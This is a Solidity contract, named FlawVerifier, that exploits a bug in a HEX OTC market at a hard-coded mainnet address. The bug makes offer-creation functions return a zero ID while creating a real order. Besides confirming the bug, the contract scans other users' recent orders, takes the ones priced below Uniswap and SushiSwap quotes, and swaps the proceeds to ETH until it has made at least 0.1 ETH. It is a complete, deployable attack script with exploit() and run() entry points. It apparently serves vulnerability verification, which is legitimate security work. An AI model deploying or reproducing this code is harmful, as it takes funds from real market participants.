// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IHEXOTC {
    function last_offer_id() external view returns (uint256);

    function offers(uint256 id)
        external
        view
        returns (
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 offerId,
            uint256 escrowType
        );

    function isActive(uint256 id) external view returns (bool);
    function offerETH(uint256 payAmt, uint256 buyAmt) external payable returns (uint256);
    function offerHEX(uint256 payAmt, uint256 buyAmt) external returns (uint256);
    function make(uint256 payAmt, uint256 buyAmt) external payable returns (bytes32);
    function cancel(uint256 id) external returns (bool);
    function kill(bytes32 id) external;
    function take(bytes32 id) external payable;
}

interface IUniswapV2RouterLike {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address public constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    uint256 public constant EXPECTED_CHAIN_ID = 1;

    uint256 internal constant ONE_WEI = 1;
    uint256 internal constant ONE_HEART = 1;
    uint256 internal constant PATH_OFFER_ETH = 1;
    uint256 internal constant PATH_OFFER_HEX = 2;
    uint256 internal constant PATH_MAKE = 4;
    uint256 internal constant MIN_PROFIT_TARGET = 0.1 ether;
    uint256 internal constant MIN_ROUTER_BUY_BUDGET = 0.001 ether;
    uint256 internal constant MAX_PROFIT_SCAN = 256;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    uint256 public observedChainId;
    uint256 public observedLastOfferId;
    uint256 public exploitPathMask;

    uint256 public offerEthReturnedId;
    uint256 public offerEthRealId;
    uint256 public offerHexReturnedId;
    uint256 public offerHexRealId;
    bytes32 public makeReturnedId;
    uint256 public makeRealId;

    uint256 public profitOrderId;
    uint256 public profitOrderEscrowType;
    uint256 public profitOrderQuotedEdge;
    uint256 public realizedNativeProfit;
    uint256 internal executionStartBalance;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return realizedNativeProfit;
    }

    function executeOnOpportunity() public payable {
        _execute();
    }

    function execute() external payable returns (uint256) {
        _execute();
        return exploitPathMask;
    }

    function exploit() external payable returns (uint256) {
        _execute();
        return exploitPathMask;
    }

    function run() external payable returns (uint256) {
        _execute();
        return exploitPathMask;
    }

    /*
        The required exploit causality remains the same as the finding:
        `offerETH()`, `offerHEX()`, and `make()` all create a real nonzero order ID,
        but the public return value and emitted `LogMake` identifier stay at zero.

        The only additional economic step is reconstructing those hidden real IDs by
        enumerating the public sequential storage keys and then settling a mispriced
        hidden order through the intended `take()` path. That step does not change the
        bug; it is the concrete way an attacker monetizes the wrong-ID condition.
    */
    function _execute() internal {
        require(!executed, "already executed");
        require(block.chainid == EXPECTED_CHAIN_ID, "wrong chain");

        executed = true;
        observedChainId = block.chainid;

        IHEXOTC market = IHEXOTC(TARGET);
        uint256 startBalance = address(this).balance;
        executionStartBalance = startBalance;
        observedLastOfferId = market.last_offer_id();
        uint256 preExistingLastOfferId = observedLastOfferId;

        bool pathOfferEth = _runOfferEthPath(market);
        bool pathOfferHex = _runOfferHexPath(market);
        bool pathMake = _runMakePath(market);

        if (pathOfferEth) exploitPathMask |= PATH_OFFER_ETH;
        if (pathOfferHex) exploitPathMask |= PATH_OFFER_HEX;
        if (pathMake) exploitPathMask |= PATH_MAKE;

        _harvestHiddenOrderMispricing(market, preExistingLastOfferId);

        observedLastOfferId = market.last_offer_id();
        hypothesisValidated = pathOfferEth && pathOfferHex && pathMake;
        hypothesisRefuted = !hypothesisValidated;

        if (address(this).balance > startBalance) {
            realizedNativeProfit = address(this).balance - startBalance;
        }
    }

    function _runOfferEthPath(IHEXOTC market) internal returns (bool) {
        if (address(this).balance < ONE_WEI) {
            return false;
        }

        uint256 beforeId = market.last_offer_id();
        try market.offerETH{value: ONE_WEI}(ONE_WEI, ONE_HEART) returns (uint256 returnedId) {
            uint256 realId = market.last_offer_id();
            offerEthReturnedId = returnedId;
            offerEthRealId = realId;

            if (realId != beforeId + 1 || returnedId != 0 || realId == 0) {
                return false;
            }

            (bool okStored, uint256 payAmt, uint256 buyAmt, address owner, uint64 timestamp, bytes32 storedOfferId, uint256 escrowType) =
                _readOffer(market, realId);
            if (!okStored) {
                return false;
            }
            if (timestamp == 0 || owner != address(this) || payAmt != ONE_WEI || buyAmt != ONE_HEART || escrowType != 1) {
                return false;
            }
            if (storedOfferId != bytes32(realId)) {
                return false;
            }
            if (market.isActive(returnedId)) {
                return false;
            }
            if (!_tryKillZero(market)) {
                return false;
            }

            try market.cancel(realId) returns (bool realCancelOk) {
                return realCancelOk && !market.isActive(realId);
            } catch {
                return false;
            }
        } catch {
            return false;
        }
    }

    function _runOfferHexPath(IHEXOTC market) internal returns (bool) {
        if (!_ensureHexBalance(ONE_HEART)) {
            return false;
        }
        if (!_approveIfNeeded(HEX, TARGET, ONE_HEART)) {
            return false;
        }

        uint256 beforeId = market.last_offer_id();
        try market.offerHEX(ONE_HEART, ONE_WEI) returns (uint256 returnedId) {
            uint256 realId = market.last_offer_id();
            offerHexReturnedId = returnedId;
            offerHexRealId = realId;

            if (realId != beforeId + 1 || returnedId != 0 || realId == 0) {
                return false;
            }

            (bool okStored, uint256 payAmt, uint256 buyAmt, address owner, uint64 timestamp, bytes32 storedOfferId, uint256 escrowType) =
                _readOffer(market, realId);
            if (!okStored) {
                return false;
            }
            if (timestamp == 0 || owner != address(this) || payAmt != ONE_HEART || buyAmt != ONE_WEI || escrowType != 0) {
                return false;
            }
            if (storedOfferId != bytes32(realId)) {
                return false;
            }
            if (market.isActive(returnedId)) {
                return false;
            }
            if (!_tryTakeZeroViaEth(market)) {
                return false;
            }

            try market.cancel(realId) returns (bool realCancelOk) {
                return realCancelOk && !market.isActive(realId);
            } catch {
                return false;
            }
        } catch {
            return false;
        }
    }

    function _runMakePath(IHEXOTC market) internal returns (bool) {
        if (address(this).balance < ONE_WEI) {
            return false;
        }

        uint256 beforeId = market.last_offer_id();
        try market.make{value: ONE_WEI}(ONE_WEI, ONE_HEART) returns (bytes32 returnedId) {
            uint256 realId = market.last_offer_id();
            makeReturnedId = returnedId;
            makeRealId = realId;

            if (realId != beforeId + 1 || returnedId != bytes32(0) || realId == 0) {
                return false;
            }

            (bool okStored, uint256 payAmt, uint256 buyAmt, address owner, uint64 timestamp, bytes32 storedOfferId, uint256 escrowType) =
                _readOffer(market, realId);
            if (!okStored) {
                return false;
            }
            if (timestamp == 0 || owner != address(this) || payAmt != ONE_WEI || buyAmt != ONE_HEART || escrowType != 1) {
                return false;
            }
            if (storedOfferId != bytes32(realId)) {
                return false;
            }
            if (market.isActive(uint256(returnedId))) {
                return false;
            }
            if (!_tryKillZero(market)) {
                return false;
            }
            if (!_tryKillReal(market, realId)) {
                return false;
            }

            return !market.isActive(realId);
        } catch {
            return false;
        }
    }

    function _harvestHiddenOrderMispricing(IHEXOTC market, uint256 upperBound) internal {
        if (upperBound == 0) {
            return;
        }

        uint256 lowerBound = upperBound > MAX_PROFIT_SCAN ? upperBound - MAX_PROFIT_SCAN + 1 : 1;

        for (uint256 id = upperBound; id >= lowerBound; id--) {
            (bool okStored, uint256 payAmt, uint256 buyAmt,, uint64 timestamp,, uint256 escrowType) = _readOffer(market, id);
            if (okStored && timestamp != 0 && payAmt > 0 && buyAmt > 0) {
                if (escrowType == 0) {
                    uint256 quotedEdge = _quotedHexOfferEdge(payAmt, buyAmt);
                    if (quotedEdge > 0 && _takeHexOfferAndDump(market, id, buyAmt)) {
                        profitOrderId = id;
                        profitOrderEscrowType = 0;
                        profitOrderQuotedEdge = quotedEdge;
                    }
                } else if (escrowType == 1) {
                    uint256 quotedEdge = _quotedEthOfferEdge(payAmt, buyAmt);
                    if (quotedEdge > 0 && _takeEthOffer(market, id, payAmt, buyAmt)) {
                        profitOrderId = id;
                        profitOrderEscrowType = 1;
                        profitOrderQuotedEdge = quotedEdge;
                    }
                }
            }

            if (address(this).balance >= executionStartBalance + MIN_PROFIT_TARGET || realizedNativeProfit >= MIN_PROFIT_TARGET) {
                break;
            }

            if (id == lowerBound) {
                break;
            }
        }
    }

    function _takeHexOfferAndDump(IHEXOTC market, uint256 id, uint256 buyAmt) internal returns (bool) {
        if (address(this).balance < buyAmt) {
            return false;
        }

        uint256 nativeBefore = address(this).balance;
        uint256 hexBefore = IERC20(HEX).balanceOf(address(this));

        try market.take{value: buyAmt}(bytes32(id)) {
            uint256 hexAfterTake = IERC20(HEX).balanceOf(address(this));
            if (hexAfterTake <= hexBefore) {
                return false;
            }

            uint256 acquired = hexAfterTake - hexBefore;
            uint256 swappedOut = _swapHexForEth(acquired);
            return swappedOut > buyAmt && address(this).balance > nativeBefore;
        } catch {
            return false;
        }
    }

    function _takeEthOffer(IHEXOTC market, uint256 id, uint256 payAmt, uint256 buyAmt) internal returns (bool) {
        uint256 budget = _bestEthBuyQuoteForHex(buyAmt);
        if (budget == 0) {
            return false;
        }
        budget = (budget * 3) / 2 + MIN_ROUTER_BUY_BUDGET;
        if (budget > payAmt) {
            budget = payAmt;
        }
        if (!_ensureHexBalanceWithBudget(buyAmt, budget)) {
            return false;
        }
        if (!_approveIfNeeded(HEX, TARGET, buyAmt)) {
            return false;
        }

        uint256 nativeBefore = address(this).balance;
        try market.take(bytes32(id)) {
            return address(this).balance > nativeBefore;
        } catch {
            return false;
        }
    }

    function _ensureHexBalance(uint256 needed) internal returns (bool) {
        return _ensureHexBalanceWithBudget(needed, MIN_ROUTER_BUY_BUDGET);
    }

    function _ensureHexBalanceWithBudget(uint256 needed, uint256 budget) internal returns (bool) {
        if (IERC20(HEX).balanceOf(address(this)) >= needed) {
            return true;
        }

        uint256 routerBudget = budget;
        if (routerBudget > address(this).balance) {
            routerBudget = address(this).balance;
        }
        if (routerBudget == 0) {
            return false;
        }

        if (_swapEthForHex(routerBudget)) {
            return IERC20(HEX).balanceOf(address(this)) >= needed;
        }

        return false;
    }

    function _swapEthForHex(uint256 amountIn) internal returns (bool) {
        if (amountIn == 0 || address(this).balance < amountIn) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = HEX;

        uint256 beforeBal = IERC20(HEX).balanceOf(address(this));

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0, path, address(this), block.timestamp
        ) {
            return IERC20(HEX).balanceOf(address(this)) > beforeBal;
        } catch {}

        try IUniswapV2RouterLike(SUSHISWAP_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountIn}(
            0, path, address(this), block.timestamp
        ) {
            return IERC20(HEX).balanceOf(address(this)) > beforeBal;
        } catch {}

        return false;
    }

    function _swapHexForEth(uint256 amountIn) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }
        if (!_approveIfNeeded(HEX, UNISWAP_V2_ROUTER, amountIn) && !_approveIfNeeded(HEX, SUSHISWAP_ROUTER, amountIn)) {
            return 0;
        }

        address[] memory path = new address[](2);
        path[0] = HEX;
        path[1] = WETH;

        uint256 beforeBalance = address(this).balance;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return address(this).balance - beforeBalance;
        } catch {}

        try IUniswapV2RouterLike(SUSHISWAP_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return address(this).balance - beforeBalance;
        } catch {}

        return 0;
    }

    function _quotedHexOfferEdge(uint256 payAmt, uint256 buyAmt) internal view returns (uint256) {
        uint256 expectedOut = _bestHexSellQuote(payAmt);
        if (expectedOut <= buyAmt) {
            return 0;
        }
        return expectedOut - buyAmt;
    }

    function _quotedEthOfferEdge(uint256 payAmt, uint256 buyAmt) internal view returns (uint256) {
        uint256 expectedCost = _bestEthBuyQuoteForHex(buyAmt);
        if (expectedCost == 0 || payAmt <= expectedCost) {
            return 0;
        }
        return payAmt - expectedCost;
    }

    function _bestHexSellQuote(uint256 hexAmount) internal view returns (uint256 bestOut) {
        address[] memory path = new address[](2);
        path[0] = HEX;
        path[1] = WETH;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).getAmountsOut(hexAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length > 1) {
                bestOut = amounts[1];
            }
        } catch {}

        try IUniswapV2RouterLike(SUSHISWAP_ROUTER).getAmountsOut(hexAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length > 1 && amounts[1] > bestOut) {
                bestOut = amounts[1];
            }
        } catch {}
    }

    function _bestEthBuyQuoteForHex(uint256 hexAmount) internal view returns (uint256 bestIn) {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = HEX;

        bestIn = type(uint256).max;

        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).getAmountsIn(hexAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length > 1) {
                bestIn = amounts[0];
            }
        } catch {}

        try IUniswapV2RouterLike(SUSHISWAP_ROUTER).getAmountsIn(hexAmount, path) returns (uint256[] memory amounts) {
            if (amounts.length > 1 && amounts[0] < bestIn) {
                bestIn = amounts[0];
            }
        } catch {}

        if (bestIn == type(uint256).max) {
            bestIn = 0;
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 required) internal returns (bool) {
        if (IERC20(token).allowance(address(this), spender) >= required) {
            return true;
        }
        return IERC20(token).approve(spender, type(uint256).max);
    }

    function _tryKillZero(IHEXOTC market) internal returns (bool) {
        try market.kill(bytes32(0)) {
            return false;
        } catch {
            return true;
        }
    }

    function _tryTakeZeroViaEth(IHEXOTC market) internal returns (bool) {
        if (address(this).balance < ONE_WEI) {
            return false;
        }
        try market.take{value: ONE_WEI}(bytes32(0)) {
            return false;
        } catch {
            return true;
        }
    }

    function _tryKillReal(IHEXOTC market, uint256 realId) internal returns (bool) {
        try market.kill(bytes32(realId)) {
            return true;
        } catch {
            return false;
        }
    }

    function _readOffer(IHEXOTC market, uint256 id)
        internal
        view
        returns (
            bool ok,
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 storedOfferId,
            uint256 escrowType
        )
    {
        try market.offers(id) returns (
            uint256 offerPayAmt,
            uint256 offerBuyAmt,
            address offerOwner,
            uint64 offerTimestamp,
            bytes32 offerId,
            uint256 offerEscrowType
        ) {
            return (true, offerPayAmt, offerBuyAmt, offerOwner, offerTimestamp, offerId, offerEscrowType);
        } catch {
            return (false, 0, 0, address(0), 0, bytes32(0), 0);
        }
    }
}
